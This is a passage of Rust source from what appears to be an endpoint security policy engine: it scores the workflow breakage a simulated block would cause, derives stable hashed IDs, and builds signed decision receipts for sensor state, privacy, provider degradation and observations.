    graph: &CausalGraph,
) -> Vec<EndpointPolicySimulationIdentityContext> {
    let mut contexts = BTreeMap::new();

    for node in graph.nodes.values() {
        collect_simulation_identity_context(
            &mut contexts,
            "host",
            &node.attributes,
            "hostId",
            node,
        );
        collect_simulation_identity_context(
            &mut contexts,
            "user",
            &node.attributes,
            "userId",
            node,
        );
        collect_simulation_identity_context(
            &mut contexts,
            "session",
            &node.attributes,
            "sessionId",
            node,
        );
        collect_simulation_identity_context(
            &mut contexts,
            "agent",
            &node.attributes,
            "agentId",
            node,
        );
        collect_simulation_identity_context(
            &mut contexts,
            "workload",
            &node.attributes,
            "workloadId",
            node,
        );
        collect_simulation_identity_context(
            &mut contexts,
            "approval",
            &node.attributes,
            "approvalId",
            node,
        );
    }

    contexts.into_values().collect()
}

fn collect_simulation_identity_context(
    contexts: &mut BTreeMap<(String, String), EndpointPolicySimulationIdentityContext>,
    identity_kind: &str,
    attributes: &BTreeMap<String, serde_json::Value>,
    attribute_key: &str,
    node: &CausalNode,
) {
    let Some(value) = attributes
        .get(attribute_key)
        .and_then(serde_json::Value::as_str)
        .map(str::trim)
        .filter(|value| !value.is_empty())
    else {
        return;
    };

    contexts
        .entry((identity_kind.to_string(), value.to_string()))
        .or_insert_with(|| EndpointPolicySimulationIdentityContext {
            identity_kind: identity_kind.to_string(),
            value: value.to_string(),
            source_node_id: node.node_id.clone(),
            source_node_kind: node.kind.clone(),
        });
}

fn simulation_tool_contexts(graph: &CausalGraph) -> Vec<EndpointPolicySimulationToolContext> {
    let mut contexts = BTreeMap::new();

    for node in graph.nodes.values() {
        if node.kind != CausalNodeKind::Tool {
            continue;
        }
        let tool_name = node.label.trim();
        if tool_name.is_empty() {
            continue;
        }
        let tool_call_id = node
            .attributes
            .get("toolCallId")
            .and_then(serde_json::Value::as_str)
            .map(str::trim)
            .filter(|value| !value.is_empty())
            .map(ToString::to_string);
        contexts
            .entry((tool_name.to_string(), tool_call_id.clone()))
            .or_insert_with(|| EndpointPolicySimulationToolContext {
                tool_name: tool_name.to_string(),
                tool_call_id,
                source_node_id: node.node_id.clone(),
            });
    }

    contexts.into_values().collect()
}

fn simulation_context_evidence_value<T: Serialize>(value: &T) -> String {
    serde_json::to_value(value)
        .ok()
        .and_then(|value| canonicalize_json(&value).ok())
        .unwrap_or_else(|| "null".to_string())
}

fn classify_simulated_affected_node(node: &CausalNode) -> EndpointPolicySimulationAffectedNode {
    let (base_score, reason) = match node.kind {
        CausalNodeKind::Host => (
            25,
            "blocking this host affects endpoint-wide local activity",
        ),
        CausalNodeKind::User => (
            48,
            "blocking this user identity can disrupt every local workflow for that principal",
        ),
        CausalNodeKind::Session => (
            36,
            "blocking this session can disrupt the active user or agent workflow",
        ),
        CausalNodeKind::Agent => (
            42,
            "blocking this agent identity can disrupt local automation workflows",
        ),
        CausalNodeKind::Workload => (
            42,
            "blocking this workload identity can disrupt delegated automation or service activity",
        ),
        CausalNodeKind::Approval => (
            18,
            "blocking this approval context affects authorized workflow bookkeeping",
        ),
        CausalNodeKind::Process => {
            if label_looks_like_developer_runtime(&node.label) {
                (
                    45,
                    "blocking this process affects a developer runtime or automation tool",
                )
            } else {
                (30, "blocking this process affects local execution")
            }
        }
        CausalNodeKind::File => {
            if label_looks_like_developer_artifact(&node.label) {
                (
                    35,
                    "blocking this file interaction may affect source, dependency, or build artifacts",
                )
            } else {
                (18, "blocking this file interaction may affect local files")
            }
        }
        CausalNodeKind::Network => {
            if label_looks_like_developer_network(&node.label) {
                (
                    40,
                    "blocking this network target may affect registry, source-control, or cloud workflows",
                )
            } else {
                (24, "blocking this network target may affect egress")
            }
        }
        CausalNodeKind::DnsName => (
            26,
            "blocking this DNS name may affect name resolution for local or developer workflows",
        ),
        CausalNodeKind::PackageScript => (
            55,
            "blocking this package-manager lifecycle script can break dependency installation",
        ),
        CausalNodeKind::Credential => (
            50,
            "blocking this credential access can break authenticated developer or cloud workflows",
        ),
        CausalNodeKind::Tool => (
            42,
            "blocking this tool call can break local agent or automation workflows",
        ),
        CausalNodeKind::BrowserDownload => (
            22,
            "blocking this browser download may affect a user-sourced artifact",
        ),
        CausalNodeKind::BrowserExtension => (
            28,
            "blocking this browser extension change may affect browser functionality",
        ),
        CausalNodeKind::PolicyDecision => (
            12,
            "blocking this policy decision node affects enforcement bookkeeping",
        ),
        CausalNodeKind::DeceptionArtifact => (
            5,
            "blocking deception material should have minimal legitimate workflow impact",
        ),
        CausalNodeKind::Other => (10, "blocking this node has unknown local workflow impact"),
    };

    EndpointPolicySimulationAffectedNode {
        node_id: node.node_id.clone(),
        kind: node.kind.clone(),
        label: node.label.clone(),
        breakage_score: base_score,
        reason: reason.to_string(),
    }
}

fn simulation_action_would_block(action: &EndpointDecisionAction) -> bool {
    matches!(
        action,
        EndpointDecisionAction::Block
            | EndpointDecisionAction::RestrictEgress
            | EndpointDecisionAction::SuspendProcessTree
            | EndpointDecisionAction::TerminateProcessTree
            | EndpointDecisionAction::QuarantineFile
            | EndpointDecisionAction::RevokeGrant
            | EndpointDecisionAction::DisablePersistence
    )
}

fn score_simulated_breakage(
    affected_nodes: &[EndpointPolicySimulationAffectedNode],
    affected_node_count: usize,
    affected_edge_count: usize,
    affected_process_count: usize,
    affected_credential_count: usize,
) -> u8 {
    let max_node_score = affected_nodes
        .iter()
        .map(|node| node.breakage_score)
        .max()
        .unwrap_or(0);
    let breadth = affected_node_count
        .saturating_sub(1)
        .saturating_mul(4)
        .min(24) as u8;
    let edge_weight = affected_edge_count.saturating_mul(2).min(16) as u8;
    let process_weight = affected_process_count
        .saturating_sub(1)
        .saturating_mul(6)
        .min(18) as u8;
    let credential_weight = if affected_credential_count > 0 { 10 } else { 0 };

    max_node_score
        .saturating_add(breadth)
        .saturating_add(edge_weight)
        .saturating_add(process_weight)
        .saturating_add(credential_weight)
        .min(100)
}

fn impact_level_for_score(score: u8) -> EndpointSimulationImpactLevel {
    match score {
        0 => EndpointSimulationImpactLevel::None,
        1..=24 => EndpointSimulationImpactLevel::Low,
        25..=49 => EndpointSimulationImpactLevel::Medium,
        50..=74 => EndpointSimulationImpactLevel::High,
        _ => EndpointSimulationImpactLevel::Critical,
    }
}

fn count_nodes_by_kind(graph: &CausalGraph, kind: CausalNodeKind) -> usize {
    graph
        .nodes
        .values()
        .filter(|node| node.kind == kind)
        .count()
}

fn label_looks_like_developer_runtime(label: &str) -> bool {
    let lower = label.to_ascii_lowercase();
    [
        "node",
        "npm",
        "pnpm",
        "yarn",
        "python",
        "pip",
        "cargo",
        "rustc",
        "go",
        "git",
        "gh ",
        "docker",
        "kubectl",
        "aws",
        "gcloud",
        "az",
        "terraform",
        "claude",
        "cursor",
        "code",
    ]
    .iter()
    .any(|needle| lower.contains(needle))
}

fn label_looks_like_developer_artifact(label: &str) -> bool {
    let lower = label.to_ascii_lowercase();
    [
        "package.json",
        "package-lock.json",
        "pnpm-lock.yaml",
        "yarn.lock",
        "cargo.toml",
        "cargo.lock",
        "pyproject.toml",
        "requirements.txt",
        ".npmrc",
        ".pypirc",
        ".aws/",
        ".ssh/",
        ".git/",
        "node_modules",
        "target/",
        ".venv",
    ]
    .iter()
    .any(|needle| lower.contains(needle))
}

fn label_looks_like_developer_network(label: &str) -> bool {
    let lower = label.to_ascii_lowercase();
    [
        "github.com",
        "api.github.com",
        "registry.npmjs.org",
        "pypi.org",
        "files.pythonhosted.org",
        "crates.io",
        "index.crates.io",
        "rubygems.org",
        "docker.io",
        "ghcr.io",
        "amazonaws.com",
        "googleapis.com",
        "azure.com",
    ]
    .iter()
    .any(|needle| lower.contains(needle))
}

#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
#[serde(default, rename_all = "camelCase", deny_unknown_fields)]
pub struct EndpointDecisionRecord {
    pub observation_id: Option<String>,
    pub finding_id: Option<String>,
    pub rule_id: Option<String>,
    pub title: Option<String>,
    pub severity: Option<DetectionSeverity>,
    pub confidence: Option<f32>,
    pub action: EndpointDecisionAction,
    pub passed: bool,
    pub ttl_seconds: Option<u64>,
    pub rollback_ref: Option<String>,
}

impl Default for EndpointDecisionRecord {
    fn default() -> Self {
        Self {
            observation_id: None,
            finding_id: None,
            rule_id: None,
            title: None,
            severity: None,
            confidence: None,
            action: EndpointDecisionAction::Observe,
            passed: false,
            ttl_seconds: None,
            rollback_ref: None,
        }
    }
}

#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize)]
#[serde(default, rename_all = "camelCase", deny_unknown_fields)]
pub struct EndpointDecisionReceipt {
    pub schema_version: String,
    pub receipt_family: EndpointDecisionReceiptFamily,
    pub local_sequence: u64,
    pub clock: EndpointClockState,
    pub signer: EndpointReceiptSigner,
    pub actor: EndpointDecisionActor,
    pub policy: EndpointPolicySnapshot,
    pub sensor_state: EndpointSensorState,
    pub decision: EndpointDecisionRecord,
    pub graph: EndpointGraphReference,
    pub evidence: Vec<EndpointReceiptEvidence>,
}

pub struct EndpointDetectionReceiptInput<'a> {
    pub local_sequence: u64,
    pub endpoint_id: &'a str,
    pub signer_identity: &'a str,
    pub policy: EndpointPolicySnapshot,
    pub sensor_state: EndpointSensorState,
    pub observation: &'a EndpointObservation,
    pub finding: &'a DetectionFinding,
    pub graph: &'a CausalGraph,
}

pub struct EndpointSensorStateReceiptInput<'a> {
    pub local_sequence: u64,
    pub endpoint_id: &'a str,
    pub signer_identity: &'a str,
    pub policy: EndpointPolicySnapshot,
    pub sensor_state: EndpointSensorState,
    pub reason: &'a str,
}

pub struct EndpointTelemetryPrivacyReceiptInput<'a> {
    pub local_sequence: u64,
    pub endpoint_id: &'a str,
    pub signer_identity: &'a str,
    pub policy: EndpointPolicySnapshot,
    pub sensor_state: EndpointSensorState,
    pub report: &'a EndpointTelemetryPrivacyReport,
}

pub struct EndpointProviderDegradationReceiptInput<'a> {
    pub local_sequence: u64,
    pub endpoint_id: &'a str,
    pub signer_identity: &'a str,
    pub policy: EndpointPolicySnapshot,
    pub sensor_state: EndpointSensorState,
    pub provider: &'a EndpointProviderState,
}

pub struct EndpointObservationReceiptInput<'a> {
    pub local_sequence: u64,
    pub endpoint_id: &'a str,
    pub signer_identity: &'a str,
    pub policy: EndpointPolicySnapshot,
    pub sensor_state: EndpointSensorState,
    pub observation: &'a EndpointObservation,
    pub graph: &'a CausalGraph,
}

pub struct EndpointPolicyDecisionReceiptInput<'a> {
    pub local_sequence: u64,
    pub signer_identity: &'a str,
    pub actor: EndpointDecisionActor,
    pub policy: EndpointPolicySnapshot,
    pub sensor_state: EndpointSensorState,
    pub action_type: &'a str,
    pub target: &'a str,
    pub allowed: bool,
    pub guard: Option<&'a str>,
    pub severity: Option<DetectionSeverity>,
    pub severity_label: Option<&'a str>,
    pub message: Option<&'a str>,
    pub details: Option<&'a serde_json::Value>,
}

pub struct EndpointGraphSliceReceiptInput<'a> {
    pub local_sequence: u64,
    pub endpoint_id: &'a str,
    pub signer_identity: &'a str,
    pub policy: EndpointPolicySnapshot,
    pub sensor_state: EndpointSensorState,
    pub root_node_id: &'a str,
    pub slice_kind: &'a str,
    pub graph: &'a CausalGraph,
}

pub struct EndpointResponseReceiptInput<'a> {
    pub local_sequence: u64,
    pub endpoint_id: &'a str,
    pub signer_identity: &'a str,
    pub actor: EndpointDecisionActor,
    pub policy: EndpointPolicySnapshot,
    pub sensor_state: EndpointSensorState,
    pub plan: &'a EndpointResponsePlan,
    pub graph: &'a CausalGraph,
}

pub struct EndpointResponseExecutionReceiptInput<'a> {
    pub local_sequence: u64,
    pub endpoint_id: &'a str,
    pub signer_identity: &'a str,
    pub actor: EndpointDecisionActor,
    pub policy: EndpointPolicySnapshot,
    pub sensor_state: EndpointSensorState,
    pub execution: &'a EndpointResponseExecutionReport,
    pub graph: &'a CausalGraph,
}

pub struct EndpointResponseRollbackReceiptInput<'a> {
    pub local_sequence: u64,
    pub endpoint_id: &'a str,
    pub signer_identity: &'a str,
    pub actor: EndpointDecisionActor,
    pub policy: EndpointPolicySnapshot,
    pub sensor_state: EndpointSensorState,
    pub rollback: &'a EndpointResponseRollbackReport,
    pub graph: &'a CausalGraph,
}

pub struct EndpointResponseAcknowledgementReceiptInput<'a> {
    pub local_sequence: u64,
    pub endpoint_id: &'a str,
    pub signer_identity: &'a str,
    pub actor: EndpointDecisionActor,
    pub policy: EndpointPolicySnapshot,
    pub sensor_state: EndpointSensorState,
    pub acknowledgement: &'a EndpointResponseAcknowledgementReport,
    pub graph: &'a CausalGraph,
}

pub struct EndpointEvidenceBundleManifestReceiptInput<'a> {
    pub local_sequence: u64,
    pub endpoint_id: &'a str,
    pub signer_identity: &'a str,
    pub policy: EndpointPolicySnapshot,
    pub sensor_state: EndpointSensorState,
    pub root_node_id: &'a str,
    pub bundle: &'a EndpointEvidenceBundleReference,
    pub graph: &'a CausalGraph,
}

pub struct EndpointSimulationReceiptInput<'a> {
    pub local_sequence: u64,
    pub endpoint_id: &'a str,
    pub signer_identity: &'a str,
    pub policy: EndpointPolicySnapshot,
    pub sensor_state: EndpointSensorState,
    pub simulation: &'a EndpointPolicySimulationReport,
    pub graph: &'a CausalGraph,
}

pub struct EndpointPolicyEventReplayReceiptInput<'a> {
    pub local_sequence: u64,
    pub endpoint_id: &'a str,
    pub signer_identity: &'a str,
    pub policy: EndpointPolicySnapshot,
    pub sensor_state: EndpointSensorState,
    pub replay_id: &'a str,
    pub event_stream_hash: &'a str,
    pub result_hash: &'a str,
    pub event_count: u64,
    pub allowed_count: u64,
    pub warn_count: u64,
    pub blocked_count: u64,
    pub track_posture: bool,
}

#[derive(Clone, Copy, Debug)]
pub struct EndpointPolicyEventReplayIdInput<'a> {
    pub policy_hash: &'a str,
    pub policy_epoch: u64,
    pub event_stream_hash: &'a str,
    pub result_hash: &'a str,
    pub event_count: u64,
    pub allowed_count: u64,
    pub warn_count: u64,
    pub blocked_count: u64,
    pub track_posture: bool,
}

pub struct EndpointPolicyEventImpactReceiptInput<'a> {
    pub local_sequence: u64,
    pub endpoint_id: &'a str,
    pub signer_identity: &'a str,
    pub policy: EndpointPolicySnapshot,
    pub sensor_state: EndpointSensorState,
    pub impact_id: &'a str,
    pub event_stream_hash: &'a str,
    pub current_result_hash: &'a str,
    pub proposed_result_hash: &'a str,
    pub impact_hash: &'a str,
    pub proposed_policy_hash: &'a str,
    pub proposed_policy_epoch: u64,
    pub event_count: u64,
    pub changed_count: u64,
    pub allow_to_block_count: u64,
    pub track_posture: bool,
}

#[derive(Clone, Copy, Debug)]
pub struct EndpointPolicyEventImpactIdInput<'a> {
    pub current_policy_hash: &'a str,
    pub current_policy_epoch: u64,
    pub proposed_policy_hash: &'a str,
    pub proposed_policy_epoch: u64,
    pub event_stream_hash: &'a str,
    pub current_result_hash: &'a str,
    pub proposed_result_hash: &'a str,
    pub impact_hash: &'a str,
    pub event_count: u64,
    pub changed_count: u64,
    pub allow_to_block_count: u64,
    pub track_posture: bool,
}

pub struct EndpointPolicyDeltaReceiptInput<'a> {
    pub local_sequence: u64,
    pub endpoint_id: &'a str,
    pub signer_identity: &'a str,
    pub policy: EndpointPolicySnapshot,
    pub sensor_state: EndpointSensorState,
    pub operation: &'a str,
    pub policy_delta_id: &'a str,
    pub staged_detection_id: &'a str,
    pub rule_id: &'a str,
    pub stage: &'a str,
    pub generated_at: &'a str,
    pub action: EndpointDecisionAction,
    pub artifact_hash: &'a str,
    pub simulation_id: &'a str,
    pub graph_slice_id: &'a str,
    pub root_node_id: &'a str,
    pub source_affected_identity_context: &'a str,
    pub source_affected_tool_context: &'a str,
    pub cross_window_impact_hash: Option<&'a str>,
    pub cross_window_recommendation_hash: Option<&'a str>,
    pub previous_policy_hash: Option<&'a str>,
    pub new_policy_hash: Option<&'a str>,
    pub backup_path: Option<&'a str>,
}

#[derive(Clone, Copy, Debug)]
pub struct EndpointPolicyDeltaIdInput<'a> {
    pub endpoint_id: &'a str,
    pub rule_id: &'a str,
    pub action: &'a EndpointDecisionAction,
    pub staged_detection_id: &'a str,
    pub stage: &'a str,
    pub generated_at: &'a str,
    pub simulation_id: &'a str,
    pub graph_slice_id: &'a str,
    pub root_node_id: &'a str,
    pub source_affected_identity_context: &'a str,
    pub source_affected_tool_context: &'a str,
}

pub struct EndpointDeceptionMaterializationReceiptInput<'a> {
    pub local_sequence: u64,
    pub endpoint_id: &'a str,
    pub signer_identity: &'a str,
    pub policy: EndpointPolicySnapshot,
    pub sensor_state: EndpointSensorState,
    pub plan: &'a DeceptionPlan,
    pub report: &'a DeceptionMaterializationReport,
    pub registered_artifact_count: usize,
}

pub struct EndpointDeceptionCleanupReceiptInput<'a> {
    pub local_sequence: u64,
    pub endpoint_id: &'a str,
    pub signer_identity: &'a str,
    pub policy: EndpointPolicySnapshot,
    pub sensor_state: EndpointSensorState,
    pub plan: &'a DeceptionPlan,
    pub report: &'a DeceptionCleanupReport,
    pub deregistered_artifact_count: usize,
    pub remaining_registered_artifact_count: usize,
}

pub struct EndpointDeceptionRotationReceiptInput<'a> {
    pub local_sequence: u64,
    pub endpoint_id: &'a str,
    pub signer_identity: &'a str,
    pub policy: EndpointPolicySnapshot,
    pub sensor_state: EndpointSensorState,
    pub old_plan: &'a DeceptionPlan,
    pub new_plan: &'a DeceptionPlan,
    pub report: &'a DeceptionRotationReport,
}

#[must_use]
pub fn endpoint_policy_event_replay_id(input: EndpointPolicyEventReplayIdInput<'_>) -> String {
    let policy_epoch = input.policy_epoch.to_string();
    let event_stream_hash = evidence_hash_for_value(input.event_stream_hash);
    let result_hash = evidence_hash_for_value(input.result_hash);
    let event_count = evidence_hash_for_value(input.event_count.to_string());
    let allowed_count = evidence_hash_for_value(input.allowed_count.to_string());
    let warn_count = evidence_hash_for_value(input.warn_count.to_string());
    let blocked_count = evidence_hash_for_value(input.blocked_count.to_string());
    let track_posture = evidence_hash_for_value(input.track_posture.to_string());
    stable_id(
        "policy_event_replay",
        [
            input.policy_hash,
            policy_epoch.as_str(),
            event_stream_hash.as_str(),
            result_hash.as_str(),
            event_count.as_str(),
            allowed_count.as_str(),
            warn_count.as_str(),
            blocked_count.as_str(),
            track_posture.as_str(),
        ],
    )
}

#[must_use]
pub fn endpoint_policy_event_impact_id(input: EndpointPolicyEventImpactIdInput<'_>) -> String {
    let current_policy_epoch = input.current_policy_epoch.to_string();
    let proposed_policy_epoch = evidence_hash_for_value(input.proposed_policy_epoch.to_string());
    let proposed_policy_hash = evidence_hash_for_value(input.proposed_policy_hash);
    let event_stream_hash = evidence_hash_for_value(input.event_stream_hash);
    let current_result_hash = evidence_hash_for_value(input.current_result_hash);
    let proposed_result_hash = evidence_hash_for_value(input.proposed_result_hash);
    let impact_hash = evidence_hash_for_value(input.impact_hash);
    let event_count = evidence_hash_for_value(input.event_count.to_string());
    let changed_count = evidence_hash_for_value(input.changed_count.to_string());
    let allow_to_block_count = evidence_hash_for_value(input.allow_to_block_count.to_string());
    let track_posture = evidence_hash_for_value(input.track_posture.to_string());
    stable_id(
        "policy_event_impact",
        [
            input.current_policy_hash,
            current_policy_epoch.as_str(),
            proposed_policy_hash.as_str(),
            proposed_policy_epoch.as_str(),
            event_stream_hash.as_str(),
            current_result_hash.as_str(),
            proposed_result_hash.as_str(),
            impact_hash.as_str(),
            event_count.as_str(),
            changed_count.as_str(),
            allow_to_block_count.as_str(),
            track_posture.as_str(),
        ],
    )
}

#[must_use]
pub fn endpoint_policy_delta_id(input: EndpointPolicyDeltaIdInput<'_>) -> String {
    let staged_detection_id = evidence_hash_for_value(input.staged_detection_id);
    let stage = evidence_hash_for_value(input.stage);
    let generated_at = evidence_hash_for_value(input.generated_at);
    let simulation_id = evidence_hash_for_value(input.simulation_id);
    let graph_slice_id = evidence_hash_for_value(input.graph_slice_id);
    let root_node_id = evidence_hash_for_value(input.root_node_id);
    let source_affected_identity_context =
        evidence_hash_for_value(input.source_affected_identity_context);
    let source_affected_tool_context = evidence_hash_for_value(input.source_affected_tool_context);
    stable_id(
        "policy_delta",
        [
            input.endpoint_id,
            input.rule_id,
            input.action.as_str(),
            staged_detection_id.as_str(),
            stage.as_str(),
            generated_at.as_str(),
            simulation_id.as_str(),
            graph_slice_id.as_str(),
            root_node_id.as_str(),
            source_affected_identity_context.as_str(),
            source_affected_tool_context.as_str(),
        ],
    )
}

impl EndpointDecisionReceipt {
    #[must_use]
    pub fn for_sensor_state(input: EndpointSensorStateReceiptInput<'_>) -> Self {
        let provider_count = input.sensor_state.providers.len();
        let active_provider_count = input
            .sensor_state
            .providers
            .iter()
            .filter(|provider| provider.active)
            .count();
        let healthy_provider_count = input
            .sensor_state
            .providers
            .iter()
            .filter(|provider| provider.healthy)
            .count();
        let degraded_provider_count = input
            .sensor_state
            .providers
            .iter()
            .filter(|provider| provider.degraded)
            .count();
        let provider_ids = input
            .sensor_state
            .providers
            .iter()
            .map(|provider| provider.provider_id.as_str())
            .collect::<Vec<_>>()
            .join(",");
        let policy_epoch = input.policy.policy_epoch.to_string();
        let provider_count_text = provider_count.to_string();
        let active_count_text = active_provider_count.to_string();
        let healthy_count_text = healthy_provider_count.to_string();
        let degraded_count_text = degraded_provider_count.to_string();
        let sensor_state_hash = endpoint_sensor_state_content_hash(&input.sensor_state);
        let sensor_state_id = stable_id(
            "sensor_state",
            [
                input.endpoint_id,
                input.policy.policy_hash.as_str(),
                policy_epoch.as_str(),
                provider_count_text.as_str(),
                active_count_text.as_str(),
                healthy_count_text.as_str(),
                degraded_count_text.as_str(),
                provider_ids.as_str(),
                sensor_state_hash.as_str(),
            ],
        );

        Self {
            schema_version: ENDPOINT_DECISION_RECEIPT_SCHEMA_VERSION.to_string(),
            receipt_family: EndpointDecisionReceiptFamily::SensorState,
            local_sequence: input.local_sequence,
            clock: EndpointClockState::default(),
            signer: EndpointReceiptSigner {
                signer_identity: input.signer_identity.to_string(),
                signer_public_key: None,
            },
            actor: EndpointDecisionActor::with_endpoint_id(input.endpoint_id),
            policy: input.policy,
            sensor_state: input.sensor_state,
            decision: EndpointDecisionRecord {
                observation_id: None,
                finding_id: Some(sensor_state_id),
                rule_id: Some("endpoint.sensor_state".to_string()),
                title: Some("Endpoint sensor and protection state captured".to_string()),
                severity: None,
                confidence: None,
                action: EndpointDecisionAction::Observe,
                passed: provider_count > 0 && healthy_provider_count == provider_count,
                ttl_seconds: None,
                rollback_ref: None,
            },
            graph: EndpointGraphReference::default(),
            evidence: vec![
                EndpointReceiptEvidence::hashed("reason", input.reason),
                EndpointReceiptEvidence::hashed("providerCount", provider_count_text),
                EndpointReceiptEvidence::hashed("activeProviderCount", active_count_text),
                EndpointReceiptEvidence::hashed("healthyProviderCount", healthy_count_text),
                EndpointReceiptEvidence::hashed("degradedProviderCount", degraded_count_text),
                EndpointReceiptEvidence::hashed("providerIds", provider_ids),
                EndpointReceiptEvidence::hashed("sensorStateHash", sensor_state_hash),
            ],
        }
    }

    #[must_use]
    pub fn for_telemetry_privacy(input: EndpointTelemetryPrivacyReceiptInput<'_>) -> Self {
        let privacy_mode = input.report.privacy_mode.as_str();
        let mut evidence = vec![
            EndpointReceiptEvidence::hashed("privacyReportId", &input.report.report_id),
            EndpointReceiptEvidence::hashed("privacyMode", privacy_mode),
            EndpointReceiptEvidence::hashed(
                "rawArtifactUploadPermitted",
                input.report.raw_artifact_upload_permitted.to_string(),
            ),
            EndpointReceiptEvidence::hashed(
                "observationCount",
                input.report.observation_count.to_string(),
            ),
            EndpointReceiptEvidence::hashed("fieldCount", input.report.field_count.to_string()),
            EndpointReceiptEvidence::hashed(
                "hashOnlyCount",
                input.report.hash_only_count.to_string(),
            ),
            EndpointReceiptEvidence::hashed(
                "metadataOnlyCount",
                input.report.metadata_only_count.to_string(),
            ),
            EndpointReceiptEvidence::hashed(
                "redactedCount",
                input.report.redacted_count.to_string(),
            ),
            EndpointReceiptEvidence::hashed(
                "rawSuppressedCount",
                input.report.raw_suppressed_count.to_string(),
            ),
            EndpointReceiptEvidence::hashed(
                "localOnlyCount",
                input.report.local_only_count.to_string(),
            ),
        ];
        if input.report.raw_artifact_upload_permitted {
            evidence.push(EndpointReceiptEvidence::hashed(
                "rawArtifactApprovalId",
                input
                    .report
                    .raw_artifact_approval_id
                    .as_deref()
                    .unwrap_or_default(),
            ));
            evidence.push(EndpointReceiptEvidence::hashed(
                "rawArtifactApprovalReasonHash",
                input
                    .report
                    .raw_artifact_approval_reason_hash
                    .as_deref()
                    .unwrap_or_default(),
            ));
        }
        Self {
            schema_version: ENDPOINT_DECISION_RECEIPT_SCHEMA_VERSION.to_string(),
            receipt_family: EndpointDecisionReceiptFamily::PrivacyReport,
            local_sequence: input.local_sequence,
            clock: EndpointClockState::default(),
            signer: EndpointReceiptSigner {
                signer_identity: input.signer_identity.to_string(),
                signer_public_key: None,
            },
            actor: EndpointDecisionActor::with_endpoint_id(input.endpoint_id),
            policy: input.policy,
            sensor_state: input.sensor_state,
            decision: EndpointDecisionRecord {
                observation_id: None,
                finding_id: Some(input.report.report_id.clone()),
                rule_id: Some("endpoint.telemetry_privacy".to_string()),
                title: Some("Endpoint telemetry privacy mode applied".to_string()),
                severity: None,
                confidence: None,
                action: EndpointDecisionAction::Observe,
                passed: true,
                ttl_seconds: None,
                rollback_ref: None,
            },
            graph: EndpointGraphReference::default(),
            evidence,
        }
    }

    #[must_use]
    pub fn for_provider_degradation(input: EndpointProviderDegradationReceiptInput<'_>) -> Self {
        let provider_kind =
            camel_debug_to_snake(format!("{:?}", input.provider.provider_kind).as_str());
        let dropped_event_count = input.provider.dropped_event_count.to_string();
        let deadline_miss_count = input.provider.deadline_miss_count.to_string();
        let full_disk_access =
            endpoint_provider_full_disk_access_evidence_value(input.provider.full_disk_access);
        let reasons = input.provider.degradation_reasons.join("|");
        let degradation_id = provider_degradation_id_from_provider(
            input.endpoint_id,
            input.policy.policy_hash.as_str(),
            input.provider,
        );

        Self {
            schema_version: ENDPOINT_DECISION_RECEIPT_SCHEMA_VERSION.to_string(),
            receipt_family: EndpointDecisionReceiptFamily::ProviderDegradation,
            local_sequence: input.local_sequence,
            clock: EndpointClockState::default(),
            signer: EndpointReceiptSigner {
                signer_identity: input.signer_identity.to_string(),
                signer_public_key: None,
            },
            actor: EndpointDecisionActor::with_endpoint_id(input.endpoint_id),
            policy: input.policy,
            sensor_state: input.sensor_state,
            decision: EndpointDecisionRecord {
                observation_id: None,
                finding_id: Some(degradation_id),
                rule_id: Some(format!(
                    "endpoint.provider_degradation.{}",
                    input.provider.provider_id
                )),
                title: Some("Endpoint provider degraded".to_string()),
                severity: None,
                confidence: None,
                action: EndpointDecisionAction::Observe,
                passed: false,
                ttl_seconds: None,
                rollback_ref: None,
            },
            graph: EndpointGraphReference::default(),
            evidence: vec![
                EndpointReceiptEvidence::hashed("providerId", &input.provider.provider_id),
                EndpointReceiptEvidence::hashed("providerKind", provider_kind),
                EndpointReceiptEvidence::hashed("installed", input.provider.installed.to_string()),
                EndpointReceiptEvidence::hashed("active", input.provider.active.to_string()),
                EndpointReceiptEvidence::hashed("healthy", input.provider.healthy.to_string()),
                EndpointReceiptEvidence::hashed("degraded", input.provider.degraded.to_string()),
                EndpointReceiptEvidence::hashed("degradationReasons", reasons),
                EndpointReceiptEvidence::hashed("droppedEventCount", dropped_event_count),
                EndpointReceiptEvidence::hashed("deadlineMissCount", deadline_miss_count),
                EndpointReceiptEvidence::hashed("fullDiskAccess", full_disk_access),
            ],
        }
    }

    #[must_use]
    pub fn for_observation(input: EndpointObservationReceiptInput<'_>) -> Self {
        let event_kind = input.observation.event_name();
        let observation_hash = endpoint_observation_content_hash(input.observation);
        let graph_ref = EndpointGraphReference::for_observation(input.observation, input.graph);
        let graph_slice_id = graph_ref.graph_slice_id.clone().unwrap_or_default();
        let process_node_id = graph_ref.process_node_id.clone().unwrap_or_default();
        let target = event_target_field(input.observation).unwrap_or_else(|| "unknown".to_string());
        let provider = input.sensor_state.providers.first();
        let provider_id = provider
            .map(|provider| provider.provider_id.clone())
            .unwrap_or_else(|| "unknown".to_string());
        let provider_kind = provider
            .map(|provider| camel_debug_to_snake(format!("{:?}", provider.provider_kind).as_str()))
            .unwrap_or_else(|| "unknown".to_string());
        let observation_receipt_id = observation_receipt_id_from_fields(
            input.endpoint_id,
            input.policy.policy_hash.as_str(),
            input.observation.observation_id.as_str(),
            event_kind,
            observation_hash.as_str(),
            target.as_str(),
            graph_slice_id.as_str(),
            process_node_id.as_str(),
            provider_id.as_str(),
            provider_kind.as_str(),
        );

        Self {
            schema_version: ENDPOINT_DECISION_RECEIPT_SCHEMA_VERSION.to_string(),
            receipt_family: EndpointDecisionReceiptFamily::Observation,
            local_sequence: input.local_sequence,
            clock: EndpointClockState::default(),
            signer: EndpointReceiptSigner {
                signer_identity: input.signer_identity.to_string(),
                signer_public_key: None,
            },
            actor: EndpointDecisionActor::from_observation(input.endpoint_id, input.observation),
            policy: input.policy,
            sensor_state: input.sensor_state,
            decision: EndpointDecisionRecord {
                observation_id: Some(input.observation.observation_id.clone()),
                finding_id: Some(observation_receipt_id),
                rule_id: Some(format!("endpoint.observation.{event_kind}")),
                title: Some("Endpoint provider observation recorded".to_string()),
                severity: None,
                confidence: Some(1.0),
                action: EndpointDecisionAction::Observe,
                passed: true,
                ttl_seconds: None,
                rollback_ref: None,
            },
            graph: graph_ref,
            evidence: vec![
                EndpointReceiptEvidence::hashed(
                    "observationId",
                    input.observation.observation_id.as_str(),
                ),
                EndpointReceiptEvidence::hashed("eventKind", event_kind),
                EndpointReceiptEvidence::hashed("observationHash", observation_hash),
                EndpointReceiptEvidence::hashed("target", target),
                EndpointReceiptEvidence::hashed("graphSliceId", graph_slice_id),
                EndpointReceiptEvidence::hashed("processNodeId", process_node_id),
                EndpointReceiptEvidence::hashed("providerId", provider_id),
